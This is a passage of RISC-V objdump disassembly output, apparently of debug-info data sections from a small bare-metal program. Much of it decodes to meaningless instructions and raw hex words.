     962:	8001                	srli	s0,s0,0x0
     964:	0000                	unimp
     966:	0000                	unimp
     968:	b608                	fsd	fa0,40(a2)
     96a:	0008                	0x8
     96c:	7900                	ld	s0,48(a0)
     96e:	0009                	c.nop	2
     970:	2300                	fld	fs0,0(a4)
     972:	0074                	addi	a3,sp,12
     974:	0000                	unimp
     976:	3fff                	0x3fff
     978:	2200                	fld	fs0,0(a2)
     97a:	0370                	addi	a2,sp,396
     97c:	0000                	unimp
     97e:	2202                	fld	ft4,0(sp)
     980:	0968                	addi	a0,sp,156
     982:	0000                	unimp
     984:	0309                	addi	t1,t1,2
     986:	6c40                	ld	s0,152(s0)
     988:	8001                	srli	s0,s0,0x0
     98a:	0000                	unimp
     98c:	0000                	unimp
     98e:	3922                	fld	fs2,40(sp)
     990:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     994:	7324                	ld	s1,96(a4)
     996:	0005                	c.nop	1
     998:	0900                	addi	s0,sp,144
     99a:	002b6803          	lwu	a6,2(s6)
     99e:	0080                	addi	s0,sp,64
     9a0:	0000                	unimp
     9a2:	2200                	fld	fs0,0(a2)
     9a4:	05e5                	addi	a1,a1,25
     9a6:	0000                	unimp
     9a8:	4402                	lw	s0,0(sp)
     9aa:	08c1                	addi	a7,a7,16
     9ac:	0000                	unimp
     9ae:	0309                	addi	t1,t1,2
     9b0:	2b70                	fld	fa2,208(a4)
     9b2:	8000                	0x8000
     9b4:	0000                	unimp
     9b6:	0000                	unimp
     9b8:	2922                	fld	fs2,8(sp)
     9ba:	0001                	nop
     9bc:	0200                	addi	s0,sp,256
     9be:	c145                	beqz	a0,a5e <_tbss_end+0x9da>
     9c0:	0008                	0x8
     9c2:	0900                	addi	s0,sp,144
     9c4:	002b8803          	lb	a6,2(s7)
     9c8:	0080                	addi	s0,sp,64
     9ca:	0000                	unimp
     9cc:	2200                	fld	fs0,0(a2)
     9ce:	00ec                	addi	a1,sp,76
     9d0:	0000                	unimp
     9d2:	4602                	lw	a2,0(sp)
     9d4:	08b6                	slli	a7,a7,0xd
     9d6:	0000                	unimp
     9d8:	0309                	addi	t1,t1,2
     9da:	2b78                	fld	fa4,208(a4)
     9dc:	8000                	0x8000
     9de:	0000                	unimp
     9e0:	0000                	unimp
     9e2:	c108                	sw	a0,0(a0)
     9e4:	0008                	0x8
     9e6:	f200                	sd	s0,32(a2)
     9e8:	0009                	c.nop	2
     9ea:	0900                	addi	s0,sp,144
     9ec:	0074                	addi	a3,sp,12
     9ee:	0000                	unimp
     9f0:	00ff                	0xff
     9f2:	7324                	ld	s1,96(a4)
     9f4:	7274                	ld	a3,224(a2)
     9f6:	0200                	addi	s0,sp,256
     9f8:	0009e247          	fmsub.s	ft4,fs3,ft0,ft0,unknown
     9fc:	0900                	addi	s0,sp,144
     9fe:	01ac4003          	lbu	zero,26(s8) # 1d01a <_tbss_end+0x1cf96>
     a02:	0080                	addi	s0,sp,64
     a04:	0000                	unimp
     a06:	2400                	fld	fs0,8(s0)
     a08:	6964                	ld	s1,208(a0)
     a0a:	0076                	c.slli	zero,0x1d
     a0c:	4802                	lw	a6,0(sp)
     a0e:	08c1                	addi	a7,a7,16
     a10:	0000                	unimp
     a12:	0309                	addi	t1,t1,2
     a14:	2b80                	fld	fs0,16(a5)
     a16:	8000                	0x8000
     a18:	0000                	unimp
     a1a:	0000                	unimp
     a1c:	e025                	bnez	s0,a7c <_tbss_end+0x9f8>
     a1e:	0005                	c.nop	1
     a20:	0200                	addi	s0,sp,256
     a22:	5464                	lw	s1,108(s0)
     a24:	0000                	unimp
     a26:	e400                	sd	s0,8(s0)
     a28:	0012                	c.slli	zero,0x4
     a2a:	0080                	addi	s0,sp,64
     a2c:	0000                	unimp
     a2e:	9600                	0x9600
     a30:	0002                	c.slli	zero,0x0
     a32:	0000                	unimp
     a34:	0000                	unimp
     a36:	0100                	addi	s0,sp,128
     a38:	979c                	0x979c
     a3a:	2600000b          	0x2600000b
     a3e:	0000010f          	0x10f
     a42:	6602                	ld	a2,0(sp)
     a44:	08c1                	addi	a7,a7,16
     a46:	0000                	unimp
     a48:	9102                	jalr	sp
     a4a:	2668                	fld	fa0,200(a2)
     a4c:	05b5                	addi	a1,a1,13
     a4e:	0000                	unimp
     a50:	6702                	ld	a4,0(sp)
     a52:	08c1                	addi	a7,a7,16
     a54:	0000                	unimp
     a56:	7fb09103          	lh	sp,2043(ra)
     a5a:	8926                	mv	s2,s1
     a5c:	0000                	unimp
     a5e:	0200                	addi	s0,sp,256
     a60:	0008c167          	0x8c167
     a64:	0300                	addi	s0,sp,384
     a66:	a091                	j	aaa <_tbss_end+0xa26>
     a68:	267f                	0x267f
     a6a:	05c9                	addi	a1,a1,18
     a6c:	0000                	unimp
     a6e:	6802                	ld	a6,0(sp)
     a70:	09e2                	slli	s3,s3,0x18
     a72:	0000                	unimp
     a74:	0309                	addi	t1,t1,2
     a76:	b440                	fsd	fs0,168(s0)
     a78:	8001                	srli	s0,s0,0x0
     a7a:	0000                	unimp
     a7c:	0000                	unimp
     a7e:	00132c27          	fsw	ft1,24(t1) # 3180c <_tbss_end+0x31788>
     a82:	0080                	addi	s0,sp,64
     a84:	0000                	unimp
     a86:	4200                	lw	s0,0(a2)
     a88:	0002                	c.slli	zero,0x0
     a8a:	0000                	unimp
     a8c:	0000                	unimp
     a8e:	2800                	fld	fs0,16(s0)
     a90:	656c                	ld	a1,200(a0)
     a92:	006e                	c.slli	zero,0x1b
     a94:	6e02                	ld	t3,0(sp)
     a96:	08c1                	addi	a7,a7,16
     a98:	0000                	unimp
     a9a:	9102                	jalr	sp
     a9c:	2760                	fld	fs0,200(a4)
     a9e:	1332                	slli	t1,t1,0x2c
     aa0:	8000                	0x8000
     aa2:	0000                	unimp
     aa4:	0000                	unimp
     aa6:	0228                	addi	a0,sp,264
     aa8:	0000                	unimp
     aaa:	0000                	unimp
     aac:	0000                	unimp
     aae:	0c26                	slli	s8,s8,0x9
     ab0:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     ab4:	9791                	srai	a5,a5,0x24
     ab6:	0300000b          	0x300000b
     aba:	9891                	andi	s1,s1,-28
     abc:	267f                	0x267f
     abe:	0099                	addi	ra,ra,6
     ac0:	0000                	unimp
     ac2:	9202                	jalr	tp
     ac4:	00000ba7          	0xba7
     ac8:	7f889103          	lh	sp,2040(a7)
     acc:	3229                	addiw	tp,tp,-22
     ace:	00800013          	li	zero,8
     ad2:	0000                	unimp
     ad4:	3000                	fld	fs0,32(s0)
     ad6:	0000                	unimp
     ad8:	0000                	unimp
     ada:	0000                	unimp
     adc:	f000                	sd	s0,32(s0)
     ade:	000a                	c.slli	zero,0x2
     ae0:	2600                	fld	fs0,8(a2)
     ae2:	04dd                	addi	s1,s1,23
     ae4:	0000                	unimp
     ae6:	7202                	ld	tp,32(sp)
     ae8:	08c1                	addi	a7,a7,16
     aea:	0000                	unimp
     aec:	9102                	jalr	sp
     aee:	0058                	addi	a4,sp,4
     af0:	00136227          	0x136227
     af4:	0080                	addi	s0,sp,64
     af6:	0000                	unimp
     af8:	d800                	sw	s0,48(s0)
     afa:	0000                	unimp
     afc:	0000                	unimp
     afe:	0000                	unimp
     b00:	2600                	fld	fs0,8(a2)
     b02:	0014                	0x14
     b04:	0000                	unimp
     b06:	7802                	ld	a6,32(sp)
     b08:	08c1                	addi	a7,a7,16
     b0a:	0000                	unimp
     b0c:	9102                	jalr	sp
     b0e:	2750                	fld	fa2,136(a4)
     b10:	1380                	addi	s0,sp,480
     b12:	8000                	0x8000
     b14:	0000                	unimp
     b16:	0000                	unimp
     b18:	00a6                	slli	ra,ra,0x9
     b1a:	0000                	unimp
     b1c:	0000                	unimp
     b1e:	0000                	unimp
     b20:	6928                	ld	a0,80(a0)
     b22:	0200                	addi	s0,sp,256
     b24:	c181                	beqz	a1,b24 <_tbss_end+0xaa0>
     b26:	0008                	0x8
     b28:	0200                	addi	s0,sp,256
     b2a:	4891                	li	a7,4
     b2c:	00138627          	0x138627
     b30:	0080                	addi	s0,sp,64
     b32:	0000                	unimp
     b34:	8a00                	0x8a00
     b36:	0000                	unimp
     b38:	0000                	unimp
     b3a:	0000                	unimp
     b3c:	2600                	fld	fs0,8(a2)
     b3e:	0382                	slli	t2,t2,0x0
     b40:	0000                	unimp
     b42:	8302                	jr	t1
     b44:	08c1                	addi	a7,a7,16
     b46:	0000                	unimp
     b48:	9102                	jalr	sp
     b4a:	2940                	fld	fs0,144(a0)
     b4c:	138a                	slli	t2,t2,0x22
     b4e:	8000                	0x8000
     b50:	0000                	unimp
     b52:	0000                	unimp
     b54:	000c                	0xc
     b56:	0000                	unimp
     b58:	0000                	unimp
     b5a:	0000                	unimp
     b5c:	0b70                	addi	a2,sp,412
     b5e:	0000                	unimp
     b60:	ab26                	fsd	fs1,400(sp)
     b62:	0001                	nop
     b64:	0200                	addi	s0,sp,256
     b66:	7484                	ld	s1,40(s1)
     b68:	0000                	unimp
     b6a:	0300                	addi	s0,sp,384
     b6c:	b891                	j	3c0 <_tbss_end+0x33c>
     b6e:	007f                	0x7f
     b70:	0013c427          	fsq	ft1,8(t2)
     b74:	0080                	addi	s0,sp,64
     b76:	0000                	unimp
     b78:	0c00                	addi	s0,sp,528
     b7a:	0000                	unimp
     b7c:	0000                	unimp
     b7e:	0000                	unimp
     b80:	2600                	fld	fs0,8(a2)
     b82:	000001ab          	0x1ab
     b86:	8602                	jr	a2
     b88:	0074                	addi	a3,sp,12
     b8a:	0000                	unimp
     b8c:	7fa89103          	lh	sp,2042(a7)
     b90:	0000                	unimp
     b92:	0000                	unimp
     b94:	0000                	unimp
     b96:	0800                	addi	s0,sp,16
     b98:	08b6                	slli	a7,a7,0xd
     b9a:	0000                	unimp
     b9c:	00000ba7          	0xba7
     ba0:	7409                	lui	s0,0xfffe2
     ba2:	0000                	unimp
     ba4:	0100                	addi	s0,sp,128
     ba6:	0800                	addi	s0,sp,16
     ba8:	08c1                	addi	a7,a7,16
     baa:	0000                	unimp
     bac:	00000bb7          	lui	s7,0x0
     bb0:	7409                	lui	s0,0xfffe2
     bb2:	0000                	unimp
     bb4:	0100                	addi	s0,sp,128
     bb6:	2a00                	fld	fs0,16(a2)
     bb8:	0144                	addi	s1,sp,132
     bba:	0000                	unimp
     bbc:	4902                	lw	s2,0(sp)
     bbe:	1202                	slli	tp,tp,0x20
     bc0:	8000                	0x8000
     bc2:	0000                	unimp
     bc4:	0000                	unimp
     bc6:	00e2                	slli	ra,ra,0x18
     bc8:	0000                	unimp
     bca:	0000                	unimp
     bcc:	0000                	unimp
     bce:	9c01                	subw	s0,s0,s0
     bd0:	00000c03          	lb	s8,0(zero) # 0 <_tdata_begin>
     bd4:	7864692b          	0x7864692b
     bd8:	0200                	addi	s0,sp,256
     bda:	c149                	beqz	a0,c5c <_tbss_end+0xbd8>
     bdc:	0008                	0x8
     bde:	0200                	addi	s0,sp,256
     be0:	5891                	li	a7,-28
     be2:	0012c427          	fsq	ft1,8(t0) # 4008 <_tbss_end+0x3f84>
     be6:	0080                	addi	s0,sp,64
     be8:	0000                	unimp
     bea:	0c00                	addi	s0,sp,528
     bec:	0000                	unimp
     bee:	0000                	unimp
     bf0:	0000                	unimp
     bf2:	2600                	fld	fs0,8(a2)
     bf4:	000001ab          	0x1ab
     bf8:	6002                	0x6002
     bfa:	0074                	addi	a3,sp,12
     bfc:	0000                	unimp
     bfe:	9102                	jalr	sp
     c00:	0068                	addi	a0,sp,12
     c02:	2a00                	fld	fs0,16(a2)
     c04:	031c                	addi	a5,sp,384
     c06:	0000                	unimp
     c08:	3102                	fld	ft2,32(sp)
     c0a:	1116                	slli	sp,sp,0x25
     c0c:	8000                	0x8000
     c0e:	0000                	unimp
     c10:	0000                	unimp
     c12:	00ec                	addi	a1,sp,76
     c14:	0000                	unimp
     c16:	0000                	unimp
     c18:	0000                	unimp
     c1a:	9c01                	subw	s0,s0,s0
     c1c:	00000c77          	0xc77
     c20:	112c                	addi	a1,sp,168
     c22:	0002                	c.slli	zero,0x0
     c24:	0200                	addi	s0,sp,256
     c26:	7731                	lui	a4,0xfffec
     c28:	000c                	0xc
     c2a:	0200                	addi	s0,sp,256
     c2c:	5891                	li	a7,-28
     c2e:	ee2c                	sd	a1,88(a2)
     c30:	0001                	nop
     c32:	0200                	addi	s0,sp,256
     c34:	c131                	beqz	a0,c78 <_tbss_end+0xbf4>
     c36:	0008                	0x8
     c38:	0200                	addi	s0,sp,256
     c3a:	5091                	li	ra,-28
     c3c:	e22c                	sd	a1,64(a2)
     c3e:	0004                	0x4
     c40:	0200                	addi	s0,sp,256
     c42:	7d31                	lui	s10,0xfffec
     c44:	000c                	0xc
     c46:	0200                	addi	s0,sp,256
     c48:	4891                	li	a7,4
     c4a:	542c                	lw	a1,104(s0)
     c4c:	0001                	nop
     c4e:	0200                	addi	s0,sp,256
     c50:	7731                	lui	a4,0xfffec
     c52:	000c                	0xc
     c54:	0200                	addi	s0,sp,256
     c56:	4091                	li	ra,4
     c58:	00113e27          	fsd	ft1,28(sp)
     c5c:	0080                	addi	s0,sp,64
     c5e:	0000                	unimp
     c60:	bc00                	fsd	fs0,56(s0)
     c62:	0000                	unimp
     c64:	0000                	unimp
     c66:	0000                	unimp
     c68:	2800                	fld	fs0,16(s0)
     c6a:	0069                	c.nop	26
     c6c:	3502                	fld	fa0,32(sp)
     c6e:	08c1                	addi	a7,a7,16
     c70:	0000                	unimp
     c72:	9102                	jalr	sp
     c74:	0068                	addi	a0,sp,12
     c76:	0f00                	addi	s0,sp,912
     c78:	c108                	sw	a0,0(a0)
     c7a:	0008                	0x8
     c7c:	0f00                	addi	s0,sp,912
     c7e:	b608                	fsd	fa0,40(a2)
     c80:	0008                	0x8
     c82:	2d00                	fld	fs0,24(a0)
     c84:	0242                	slli	tp,tp,0x10
     c86:	0000                	unimp
     c88:	4601                	li	a2,0
     c8a:	1048                	addi	a0,sp,36
     c8c:	8000                	0x8000
     c8e:	0000                	unimp
     c90:	0000                	unimp
     c92:	00ce                	slli	ra,ra,0x13
     c94:	0000                	unimp
     c96:	0000                	unimp
     c98:	0000                	unimp
     c9a:	9c01                	subw	s0,s0,s0
     c9c:	842c                	0x842c
     c9e:	0000                	unimp
     ca0:	0100                	addi	s0,sp,128
     ca2:	c146                	sw	a7,128(sp)
     ca4:	0008                	0x8
     ca6:	0300                	addi	s0,sp,384
     ca8:	a891                	j	cfc <_tbss_end+0xc78>
     caa:	2b7f                	0x2b7f
     cac:	01007a73          	csrrci	s4,0x10,0
     cb0:	c146                	sw	a7,128(sp)
     cb2:	0008                	0x8
     cb4:	0300                	addi	s0,sp,384
     cb6:	a091                	j	cfa <_tbss_end+0xc76>
     cb8:	267f                	0x267f
     cba:	03a5                	addi	t2,t2,9
     cbc:	0000                	unimp
     cbe:	4c01                	li	s8,0
     cc0:	08c1                	addi	a7,a7,16
     cc2:	0000                	unimp
     cc4:	9102                	jalr	sp
     cc6:	2668                	fld	fa0,200(a2)
     cc8:	00ec                	addi	a1,sp,76
     cca:	0000                	unimp
     ccc:	5b01                	li	s6,-32
     cce:	08b6                	slli	a7,a7,0xd
     cd0:	0000                	unimp
     cd2:	9102                	jalr	sp
     cd4:	05372657          	0x5372657
     cd8:	0000                	unimp
     cda:	6101                	0x6101
     cdc:	08c1                	addi	a7,a7,16
     cde:	0000                	unimp
     ce0:	9102                	jalr	sp
     ce2:	2748                	fld	fa0,136(a4)
     ce4:	10a0                	addi	s0,sp,104
     ce6:	8000                	0x8000
     ce8:	0000                	unimp
     cea:	0000                	unimp
     cec:	006e                	c.slli	zero,0x1b
     cee:	0000                	unimp
     cf0:	0000                	unimp
     cf2:	0000                	unimp
     cf4:	6928                	ld	a0,80(a0)
     cf6:	0100                	addi	s0,sp,128
     cf8:	c164                	sw	s1,68(a0)
     cfa:	0008                	0x8
     cfc:	0200                	addi	s0,sp,256
     cfe:	6091                	lui	ra,0x4
     d00:	0010a627          	fsw	ft1,12(ra) # 400c <_tbss_end+0x3f88>
     d04:	0080                	addi	s0,sp,64
     d06:	0000                	unimp
     d08:	5200                	lw	s0,32(a2)
     d0a:	0000                	unimp
     d0c:	0000                	unimp
     d0e:	0000                	unimp
     d10:	2600                	fld	fs0,8(a2)
     d12:	003a                	c.slli	zero,0xe
     d14:	0000                	unimp
     d16:	6701                	0x6701
     d18:	08c1                	addi	a7,a7,16
     d1a:	0000                	unimp
     d1c:	9102                	jalr	sp
     d1e:	2740                	fld	fs0,136(a4)
     d20:	10bc                	addi	a5,sp,104
     d22:	8000                	0x8000
     d24:	0000                	unimp
     d26:	0000                	unimp
     d28:	003c                	addi	a5,sp,8
     d2a:	0000                	unimp
     d2c:	0000                	unimp
     d2e:	0000                	unimp
     d30:	6a28                	ld	a0,80(a2)
     d32:	0100                	addi	s0,sp,128
     d34:	0008c16b          	0x8c16b
     d38:	0200                	addi	s0,sp,256
     d3a:	5891                	li	a7,-28
     d3c:	0010c227          	fsq	ft1,4(ra)
     d40:	0080                	addi	s0,sp,64
     d42:	0000                	unimp
     d44:	2200                	fld	fs0,0(a2)
     d46:	0000                	unimp
     d48:	0000                	unimp
     d4a:	0000                	unimp
     d4c:	2600                	fld	fs0,8(a2)
     d4e:	00c8                	addi	a0,sp,68
     d50:	0000                	unimp
     d52:	6e01                	0x6e01
     d54:	08c1                	addi	a7,a7,16
     d56:	0000                	unimp
     d58:	7fb89103          	lh	sp,2043(a7)
     d5c:	0000                	unimp
     d5e:	0000                	unimp
     d60:	0000                	unimp
     d62:	002a                	c.slli	zero,0xa
     d64:	0000                	unimp
     d66:	0002                	c.slli	zero,0x0
     d68:	025d                	addi	tp,tp,23
     d6a:	0000                	unimp
     d6c:	0108                	addi	a0,sp,128
     d6e:	03c5                	addi	t2,t2,17
     d70:	0000                	unimp
     d72:	0000                	unimp
     d74:	8000                	0x8000
     d76:	0000                	unimp
     d78:	0000                	unimp
     d7a:	01c6                	slli	gp,gp,0x11
     d7c:	8000                	0x8000
     d7e:	0000                	unimp
     d80:	0000                	unimp
     d82:	05f9                	addi	a1,a1,30
     d84:	0000                	unimp
     d86:	00000603          	lb	a2,0(zero) # 0 <_tdata_begin>
     d8a:	062c                	addi	a1,sp,776
     d8c:	0000                	unimp
     d8e:	8001                	srli	s0,s0,0x0
     d90:	002a                	c.slli	zero,0xa
     d92:	0000                	unimp
     d94:	0002                	c.slli	zero,0x0
     d96:	0271                	addi	tp,tp,28
     d98:	0000                	unimp
     d9a:	0108                	addi	a0,sp,128
     d9c:	07bd                	addi	a5,a5,15
     d9e:	0000                	unimp
     da0:	157a                	slli	a0,a0,0x3e
     da2:	8000                	0x8000
     da4:	0000                	unimp
     da6:	0000                	unimp
     da8:	15a8                	addi	a0,sp,744
     daa:	8000                	0x8000
     dac:	0000                	unimp
     dae:	0000                	unimp
     db0:	0638                	addi	a4,sp,776
     db2:	0000                	unimp
     db4:	00000603          	lb	a2,0(zero) # 0 <_tdata_begin>
     db8:	062c                	addi	a1,sp,776
     dba:	0000                	unimp
     dbc:	8001                	srli	s0,s0,0x0
     dbe:	17c6                	slli	a5,a5,0x31
     dc0:	0000                	unimp
     dc2:	0004                	0x4
     dc4:	0285                	addi	t0,t0,1
     dc6:	0000                	unimp
     dc8:	0108                	addi	a0,sp,128
     dca:	0861                	addi	a6,a6,24
     dcc:	0000                	unimp
     dce:	0b0c                	addi	a1,sp,400
     dd0:	38000007          	0x38000007
     dd4:	a8000007          	0xa8000007
     dd8:	0015                	c.nop	5
     dda:	0080                	addi	s0,sp,64
     ddc:	0000                	unimp
     dde:	1400                	addi	s0,sp,544
     de0:	0012                	c.slli	zero,0x4
     de2:	0000                	unimp
     de4:	0000                	unimp
     de6:	4900                	lw	s0,16(a0)
     de8:	0008                	0x8
     dea:	0200                	addi	s0,sp,256
     dec:	0601                	addi	a2,a2,0
     dee:	03b4                	addi	a3,sp,456
     df0:	0000                	unimp
     df2:	0102                	slli	sp,sp,0x0
     df4:	b208                	fsd	fa0,32(a2)
     df6:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     dfa:	0502                	slli	a0,a0,0x0
     dfc:	000003d7          	0x3d7
     e00:	0202                	slli	tp,tp,0x0
     e02:	00022607          	flw	fa2,0(tp) # a764 <_tbss_end+0xa6e0>
     e06:	0300                	addi	s0,sp,384
     e08:	0504                	addi	s1,sp,640
     e0a:	6e69                	lui	t3,0x1a
     e0c:	0074                	addi	a3,sp,12
     e0e:	4904                	lw	s1,16(a0)
     e10:	0000                	unimp
     e12:	0500                	addi	s0,sp,640
     e14:	0050                	addi	a2,sp,4
     e16:	0000                	unimp
     e18:	4905                	li	s2,1
     e1a:	0000                	unimp
     e1c:	0200                	addi	s0,sp,256
     e1e:	0704                	addi	s1,sp,896
     e20:	006e                	c.slli	zero,0x1b
     e22:	0000                	unimp
     e24:	0802                	slli	a6,a6,0x0
     e26:	d705                	beqz	a4,d4e <_tbss_end+0xcca>
     e28:	0000                	unimp
     e2a:	0600                	addi	s0,sp,768
     e2c:	00000377          	0x377
     e30:	6904                	ld	s1,16(a0)
     e32:	7919                	lui	s2,0xfffe6
     e34:	0000                	unimp
     e36:	0200                	addi	s0,sp,256
     e38:	0708                	addi	a0,sp,896
     e3a:	0069                	c.nop	26
     e3c:	0000                	unimp
     e3e:	1706                	slli	a4,a4,0x21
     e40:	0008                	0x8
     e42:	0400                	addi	s0,sp,512
     e44:	1ae8                	addi	a0,sp,380
     e46:	0079                	c.nop	30
     e48:	0000                	unimp
     e4a:	7906                	ld	s2,96(sp)
     e4c:	05000003          	lb	zero,80(zero) # 50 <buf.2990+0x10>
     e50:	143c                	addi	a5,sp,552
     e52:	006d                	c.nop	27
     e54:	0000                	unimp
     e56:	8c04                	0x8c04
     e58:	0000                	unimp
     e5a:	0600                	addi	s0,sp,768
     e5c:	0819                	addi	a6,a6,6
     e5e:	0000                	unimp
     e60:	5205                	li	tp,-31
     e62:	8015                	srli	s0,s0,0x5
     e64:	0000                	unimp
     e66:	0500                	addi	s0,sp,640
     e68:	009d                	addi	ra,ra,7
     e6a:	0000                	unimp
     e6c:	6606                	ld	a2,64(sp)
     e6e:	0005                	c.nop	1
     e70:	0600                	addi	s0,sp,768
     e72:	17d1                	addi	a5,a5,-12
     e74:	0079                	c.nop	30
     e76:	0000                	unimp
     e78:	0802                	slli	a6,a6,0x0
     e7a:	d205                	beqz	a2,d9a <_tbss_end+0xd16>
     e7c:	0000                	unimp
     e7e:	0200                	addi	s0,sp,256
     e80:	0410                	addi	a2,sp,512
     e82:	0326                	slli	t1,t1,0x9
     e84:	0000                	unimp
     e86:	00027407          	0x27407
     e8a:	0600                	addi	s0,sp,768
     e8c:	015e                	slli	sp,sp,0x17
     e8e:	00005f17          	auipc	t5,0x5
     e92:	0600                	addi	s0,sp,768
     e94:	0362                	slli	t1,t1,0x18
     e96:	0000                	unimp
     e98:	660e2e07          	flw	ft8,1632(t3) # 1a660 <_tbss_end+0x1a5dc>
     e9c:	0000                	unimp
     e9e:	0600                	addi	s0,sp,768
     ea0:	04c2                	slli	s1,s1,0x10
     ea2:	0000                	unimp
     ea4:	660e7407          	0x660e7407
     ea8:	0000                	unimp
     eaa:	0600                	addi	s0,sp,768
     eac:	0564                	addi	s1,sp,652
     eae:	0000                	unimp
     eb0:	66179307          	0x66179307
     eb4:	0000                	unimp
     eb6:	0800                	addi	s0,sp,16
     eb8:	0704                	addi	s1,sp,896
     eba:	03a5                	addi	t2,t2,9
     ebc:	0000011b          	sext.w	sp,zero
     ec0:	6e09                	lui	t3,0x2
     ec2:	0002                	c.slli	zero,0x0
     ec4:	0700                	addi	s0,sp,896
     ec6:	00c80ca7          	0xc80ca7
     eca:	0000                	unimp
     ecc:	fa09                	bnez	a2,dde <_tbss_end+0xd5a>
     ece:	0001                	nop
     ed0:	0700                	addi	s0,sp,896
     ed2:	13a8                	addi	a0,sp,488
     ed4:	0000011b          	sext.w	sp,zero
     ed8:	0a00                	addi	s0,sp,272
     eda:	0034                	addi	a3,sp,8
     edc:	0000                	unimp
     ede:	0000012b          	0x12b
     ee2:	0000790b          	0x790b
     ee6:	0300                	addi	s0,sp,384
     ee8:	0c00                	addi	s0,sp,528
     eea:	0708                	addi	a0,sp,896
     eec:	09a2                	slli	s3,s3,0x8
     eee:	0000014f          	fnmadd.s	ft2,ft0,ft0,ft0,rne
     ef2:	7d0d                	lui	s10,0xfffe3
     ef4:	0004                	0x4
     ef6:	0700                	addi	s0,sp,896
     ef8:	07a4                	addi	s1,sp,968
     efa:	0049                	c.nop	18
     efc:	0000                	unimp
     efe:	0d00                	addi	s0,sp,656
     f00:	0485                	addi	s1,s1,1
     f02:	0000                	unimp
     f04:	f905a907          	flw	fs2,-112(a1)
     f08:	0000                	unimp
     f0a:	0400                	addi	s0,sp,512
     f0c:	0600                	addi	s0,sp,768
     f0e:	03ff                	0x3ff
     f10:	0000                	unimp
     f12:	2b03aa07          	flw	fs4,688(t2)
     f16:	0001                	nop
     f18:	0e00                	addi	s0,sp,784
     f1a:	0f08                	addi	a0,sp,912
     f1c:	3608                	fld	fa0,40(a2)
     f1e:	0009                	c.nop	2
     f20:	0600                	addi	s0,sp,768
     f22:	0000050f          	0x50f
     f26:	1908                	addi	a0,sp,176
     f28:	5f19                	li	t5,-26
     f2a:	0000                	unimp
     f2c:	0600                	addi	s0,sp,768
     f2e:	00000393          	li	t2,0
     f32:	0c09                	addi	s8,s8,2
     f34:	490d                	li	s2,3
     f36:	0000                	unimp
     f38:	0600                	addi	s0,sp,768
     f3a:	01b1                	addi	gp,gp,12
     f3c:	0000                	unimp
     f3e:	2308                	fld	fa0,0(a4)
     f40:	00016f1b          	0x16f1b
     f44:	1000                	addi	s0,sp,32
     f46:	01c2                	slli	gp,gp,0x10
     f48:	0000                	unimp
     f4a:	0820                	addi	s0,sp,24
     f4c:	0834                	addi	a3,sp,24
     f4e:	01e1                	addi	gp,gp,24
     f50:	0000                	unimp
     f52:	200d                	0x200d
     f54:	0004                	0x4
     f56:	0800                	addi	s0,sp,16
     f58:	1336                	slli	t1,t1,0x2d
     f5a:	01e1                	addi	gp,gp,24
     f5c:	0000                	unimp
     f5e:	1100                	addi	s0,sp,160
     f60:	6b5f 0800 0737      	0x73708006b5f
     f66:	0049                	c.nop	18
     f68:	0000                	unimp
     f6a:	0d08                	addi	a0,sp,656
     f6c:	0468                	addi	a0,sp,524
     f6e:	0000                	unimp
     f70:	3708                	fld	fa0,40(a4)
     f72:	0000490b          	0x490b
     f76:	0c00                	addi	s0,sp,528
     f78:	a50d                	j	159a <_tbss_end+0x1516>
     f7a:	0001                	nop
     f7c:	0800                	addi	s0,sp,16
     f7e:	00491437          	lui	s0,0x491
     f82:	0000                	unimp
     f84:	0d10                	addi	a2,sp,656
     f86:	0000054f          	fnmadd.s	fa0,ft0,ft0,ft0,rne
     f8a:	3708                	fld	fa0,40(a4)
     f8c:	0000491b          	0x491b
     f90:	1400                	addi	s0,sp,544
     f92:	5f11                	li	t5,-28
     f94:	0078                	addi	a4,sp,12
     f96:	3808                	fld	fa0,48(s0)
     f98:	0001e70b          	0x1e70b
     f9c:	1800                	addi	s0,sp,48
     f9e:	1200                	addi	s0,sp,288
     fa0:	8708                	0x8708
     fa2:	0001                	nop
     fa4:	0a00                	addi	s0,sp,272
     fa6:	00000163          	beqz	zero,fa8 <_tbss_end+0xf24>
     faa:	000001f7          	0x1f7
     fae:	0000790b          	0x790b
     fb2:	0000                	unimp
     fb4:	1000                	addi	s0,sp,32
     fb6:	01e9                	addi	gp,gp,26
     fb8:	0000                	unimp
     fba:	0824                	addi	s1,sp,24
     fbc:	083c                	addi	a5,sp,24
     fbe:	027a                	slli	tp,tp,0x1e
     fc0:	0000                	unimp
     fc2:	bf0d                	j	ef4 <_tbss_end+0xe70>
     fc4:	0000                	unimp
     fc6:	0800                	addi	s0,sp,16
     fc8:	093e                	slli	s2,s2,0xf
     fca:	0049                	c.nop	18
     fcc:	0000                	unimp
     fce:	0d00                	addi	s0,sp,656
     fd0:	04d4                	addi	a3,sp,580
     fd2:	0000                	unimp
     fd4:	3f08                	fld	fa0,56(a4)
     fd6:	4909                	li	s2,2
     fd8:	0000                	unimp
     fda:	0400                	addi	s0,sp,512
     fdc:	f20d                	bnez	a2,efe <_tbss_end+0xe7a>
     fde:	0000                	unimp
     fe0:	0800                	addi	s0,sp,16
     fe2:	0940                	addi	s0,sp,148
     fe4:	0049                	c.nop	18
     fe6:	0000                	unimp
     fe8:	0d08                	addi	a0,sp,656
     fea:	000005ef          	jal	a1,fea <_tbss_end+0xf66>
     fee:	4108                	lw	a0,0(a0)
     ff0:	4909                	li	s2,2
     ff2:	0000                	unimp
     ff4:	0c00                	addi	s0,sp,528
     ff6:	460d                	li	a2,3
     ff8:	08000003          	lb	zero,128(zero) # 80 <buflen.2991>
     ffc:	0942                	slli	s2,s2,0x10
     ffe:	0049                	c.nop	18
    1000:	0000                	unimp
    1002:	0d10                	addi	a2,sp,656
    1004:	04ca                	slli	s1,s1,0x12
    1006:	0000                	unimp
    1008:	4308                	lw	a0,0(a4)
    100a:	4909                	li	s2,2
    100c:	0000                	unimp
    100e:	1400                	addi	s0,sp,544
    1010:	540d                	li	s0,-29
    1012:	0005                	c.nop	1
    1014:	0800                	addi	s0,sp,16
    1016:	0944                	addi	s1,sp,148
    1018:	0049                	c.nop	18
    101a:	0000                	unimp
    101c:	0d18                	addi	a4,sp,656
    101e:	03e1                	addi	t2,t2,24
    1020:	0000                	unimp
    1022:	4508                	lw	a0,8(a0)
    1024:	4909                	li	s2,2
    1026:	0000                	unimp
    1028:	1c00                	addi	s0,sp,560
    102a:	8f0d                	sub	a4,a4,a1
